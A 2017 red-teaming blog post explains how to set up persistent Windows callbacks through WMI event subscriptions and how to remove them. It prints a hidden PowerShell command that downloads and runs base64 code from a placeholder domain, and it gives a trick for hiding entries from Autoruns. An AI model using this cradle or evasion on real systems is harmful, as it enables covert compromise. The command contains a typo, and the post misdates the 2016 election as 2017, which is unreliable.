Title: Scheduling Callbacks with WMI in C++
Date: 2017-05-01 22:00
Category: Pentesting
Tags: windows, red teaming, pentesting, wmi, persistence
Slug: scheduling-callbacks-with-wmi-in-cpp
Authors: wumb0

I am going to be starting a series of posts on what I have learned on Windows pentesting and post exploitation. These posts will have a heavy focus on red teaming for competitions and cyber exercises. I am not a pentester, but I think some of the places to hide in Windows are cool so I want to write about them. These posts will include code snippets in powershell and C++. Much of this code I had to figure out how to write using the MSDN docs alone and feel that it is useful to put on the internet somewhere so others don't have to go through so much hassle to make it work. 

The topic of this post is scheduling persistent callbacks with Windows Management Instrumentation (WMI). 

# WMI Explained (in brief)
Essentially, WMI is an interface for configuration and information gathering on Windows systems. It is installed by default on Windows ME and up, which makes it a valuable resource for sysadmins and attackers. It contains information about all aspects of the system including processes, attached devices, and (I'm not kidding) games registered with Windows (`wmic /namespace:\\root\cimv2\applications\games PATH game get`). There is a lot of information here which will not be covered in this post. Exploration of what more WMI has to offer is left as an exercise to the reader!

The interface consists of namespaces, classes, and instances of classes. Namespaces contain different classes and instances are instances of classes in a namespace. Think of a namespace as a database, a class as a table schema, and an instance as a row in that table. Instances can have properties and callable methods. One of the standard examples of method calling in WMI is creating a process with the WMI command line interface command `wmic`:

```batch
wmic process call create calc.exe
```
The above line will spawn calc.exe as the current user. 
[[more]]

# Callbacks via WMI
These callbacks can be triggered based on time or based on certain system events such as process starts/stops, drive mounts/dismounts, share creation, and any other events that get triggered in WMI. I will be exploring non-timer event driven callbacks in another post. There are four WMI classes we care about for scheduling these callbacks: **CommandLineEventConsumer**, **\_\_IntervalTimerInstruction**, **\_\_EventFilter**, and **\_\_FilterToConsumerBinding**.  

## Event Consumers
Event consumers are essentially instructions on what to do when a particular event is fired. There are a four event consumers located in the ROOT/SUBSCRIPTION namespace that can be used to respond to events:   
- **CommandLineEventConsumer** - Run a cmd command  
- **ActiveScriptEventConsumer** - Run javascript or VBScript text block or file  
- **NTEventLogEventConsumer** - Log to the event log  
- **SMTPEventConsumer** - Send an email  
All four of these classes are sub-classes of **\_\_EventConsumer**.  
The first two are great for attackers, while the last two are great for defenders. In this post I will be using the **CommandLineEventConsumer** to launch callbacks in response to certain events firing. 

The properties of a **CommandLineEventConsumer** instance are detailed below:
```
class CommandLineEventConsumer : __EventConsumer
{
	[key] string Name;
	[write] string ExecutablePath;
	[Template, write] string CommandLineTemplate;
	[write] boolean UseDefaultErrorMode = FALSE;
	[DEPRECATED] boolean CreateNewConsole = FALSE;
	[write] boolean CreateNewProcessGroup = FALSE;
	[write] boolean CreateSeparateWowVdm = FALSE;
	[write] boolean CreateSharedWowVdm = FALSE;
	[write] sint32 Priority = 32;
	[write] string WorkingDirectory;
	[DEPRECATED] string DesktopName;
	[Template, write] string WindowTitle;
	[write] uint32 XCoordinate;
	[write] uint32 YCoordinate;
	[write] uint32 XSize;
	[write] uint32 YSize;
	[write] uint32 XNumCharacters;
	[write] uint32 YNumCharacters;
	[write] uint32 FillAttribute;
	[write] uint32 ShowWindowCommand;
	[write] boolean ForceOnFeedback = FALSE;
	[write] boolean ForceOffFeedback = FALSE;
	[write] boolean RunInteractively = FALSE;
	[write] uint32 KillTimeout = 0;
};
```
The properties we care about setting are *Name* and *CommandLineTemplate*. The *Name* is just the name of the consumer and the *CommandLineTemplate* is what command to run for the callback we are going to create. Lets make it an HTTP based callback:
```batch
powershell -w hidden -ep bypass -nop -c "IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(((New-Object [System.Net.WebClient).DownloadString('http://your.domain.here/callback.txt')))))";
```
This will download and run whatever base 64 encoded powershell code is at the URL http://your.domain.here/callback.txt.

## Timer Instructions
A timer instruction fires on (obviously) a timer. There are two types of timers: interval and absolute. Interval timers run at an interval specified in milliseconds where an absolute timer is fired one time when the system time reaches the time specified in the instance.  
Each of these timer types has a corresponding WMI class: **\_\_IntervalTimerInstruction** and **\_\_AbsoluteTimerInstruction**. Both are sub-classes of **\_\_TimerInstruction**. For this example I am using the interval-based version.

The properties of an **\_\_IntervalTimerInstruction** instance are detailed below:
```
class __IntervalTimerInstruction : __TimerInstruction
{
	[not_null: DisableOverride ToInstance ToSubClass, units("milliseconds"): DisableOverride ToInstance ToSubClass] uint32 IntervalBetweenEvents;
};
```
The parent class is also important and is shown below:
```
class __TimerInstruction : __EventGenerator
{
	[key] string TimerId;
	boolean SkipIfPassed = FALSE;
};
```
*TimerId* and *IntervalBetweenEvents* are the properties we care about. *TimerId* is the name of the timer and *IntervalBetweenEvents* is the number of milliseconds between event triggers. Events that are triggered at each interval are instances of the **\_\_TimerEvent** class. This information will become important in the next section.

## Event Filters
An event filter tells WMI what events and parameters we care about. We can use WMI Query Language (WQL) queries to select events that matter. Creating an event filter is as easy as creating an instance of the **\_\_EventFilter** class, which is detailed below:
```
class __EventFilter : __IndicationRelated
{
	[key] string Name;
	[read: DisableOverride ToInstance ToSubClass] uint8 CreatorSID[] = {1, 1, 0, 0, 0, 0, 0, 5, 18, 0, 0, 0};
	string QueryLanguage;
	string Query;
	string EventNamespace;
	string EventAccess;
};
```
*Name*, *QueryLanguage*, *Query*, and *EventNamespace* are of note. *Name* is the name of the filter, *QueryLanguage* specifies what query syntax to use for the *Query* field. I don't know of any other setting than WQL for *QueryLanguage*. *Query* is the actual WQL (or other) query to run to check for events. To query for the timer described above the **\_\_TimerEvent** class needs to be queried:
```wql
SELECT * from __TimerEvent where TimerId="YourTimerId"
```
Finally, the *EventNamespace* can be left blank for queries in the same namespace (which is the case for this example). If the query must be done in another namespace (such as root/cimv2 for many Windows events), then the namespace needs to be supplied. root/subscription would be represented as root\\subscription in the *Query* field. 

## Filter to Consumer Bindings
A filter to consumer binding associates an **\_\_EventFilter** instance with an **\_\_EventConsumer** instance. The *Filter* property of an instance of this class must be set to the path to the **\_\_EventFilter** created above. An example path is `__EventFilter.Name="Filter1"` where Filter1 is the *Name* of the event filter. The *Consumer* property is set up the same (ex. `CommandLineEventConsumer.Name="CliEC1"`). I have not tested it, but I think you can link consumers and filters in other namespaces by providing the full path: `ROOT\\CIMV2:__EventFilter.Name="Filter1"`.

Now that you understand the four important classes to make this all work the code is a lot easier to parse through.

# WMI Callbacks in Code

## Doing it in Powershell
Matt Graeber is a good man. He has a lot of PowerShell examples of this. I will not be writing my own PowerShell for this post but I will share some of his gists that help you schedule stuff in WMI. This code helped me write the C++ that is in the next section. 

This first script shows the full chain from storing code in the registry to creating the four WMI instances to schedule callbacks. 
<script src="https://gist.github.com/mattifestation/e55843eef6c263608206.js"></script>

The second script is a bit simpler and shows making an event consumer that gets triggered on a volume change rather than on a timer. This is also cool to do.
<script src="https://gist.github.com/mattifestation/bf9af6fbafd0c421455cd62693edcb7a.js"></script>

## Doing it in C++
This code sample was constructed from MSDN docs on the COM and the Windows WBEM interface, Matt Graeber's powershell scripts, and random other bits of knowledge scattered throughout the internet. It goes through the full chain of scheduling command line callbacks 
<script src="https://gist-it.appspot.com/https://github.com/wumb0/sh3llparty/blob/master/wmicallback.cpp"></script>

# Mitigation
The best way to stop this from happening is just to delete all event consumers, timer instructions, event filters, and filter to consumer bindings. I think the only thing that needs to be created in the subscription namespace is the event consumer since root/subscription is the only place ActiveScriptEventConsumer and CommandLineEventConsumer exist. There are no critical Windows components that require this scheduling method, so it should be okay just to delete them all:

```batch
wmic /namespace:\\root\subscription PATH __EventConsumer delete
wmic /namespace:\\root\subscription PATH __TimerInstruction delete
wmic /namespace:\\root\subscription PATH __EventFilter delete
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding delete
```
These WMI callbacks also may show up win Sysinternals Autoruns and can be deleted from its interface:
![autoruns]({filename}/images/autoruns_wmi.png)
Based on some other tests I have run I have found that autoruns shows yellow entries for ones that it cannot find the files of as shown above. Changing the command in the CommandLineTemplate property so that it uses *powershell.exe* or the absolute path of powershell instead of just *powershell* makes the entry turn red! Even worse. Entires can be hidden from autoruns by setting the CommandLineTemplate property as follows:
```batch
cmd.exe /c powershell -w hidden -ep bypass -nop -c "your stealth command here"
```
Autoruns' detection of this kind of persistence is very basic and easily bypassed :)

# Who uses this?
WMI is used by several actors mostly for information gathering and persistence. APT29 (a.k.a. Cozy Bear) uses this particular form of WMI persistence to run tasks at specified intervals. The backdoor was supposedly used in the DNC hacks that surrounded the 2017 presidential election. CrowdStrike has a [fantastic write up](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/) on their site.  
Source: [Mitre ATT&CK](https://attack.mitre.org/wiki/Technique/T1047)

# Experimentation and tools
WMI explorer (see references) was a huge help when testing this stuff out. I find it easiest to experiment in powershell and then finalize anything in C++ for delivery with malware that does other things too. Matt's scripts are a great starting point.

# References and resources
Trend Micro paper detailing WMI scheduled callbacks. - [http://la.trendmicro.com/media/misc/understanding-wmi-malware-research-paper-en.pdf](http://la.trendmicro.com/media/misc/understanding-wmi-malware-research-paper-en.pdf)  
COM API for WMI - [https://msdn.microsoft.com/en-us/library/aa389276(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/aa389276(v=vs.85).aspx)  
Code sample for setting up WMI connection in C++ - [https://msdn.microsoft.com/en-us/library/aa390423(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/aa390423(v=vs.85).aspx)  
WMI Explorer - [https://wmie.codeplex.com/](https://wmie.codeplex.com/)  
<br>
<br>
I hope this post has been informative for anyone curious about Windows internals and some of the nasty things you can accomplish with WMI. Check back for other posts in this series!
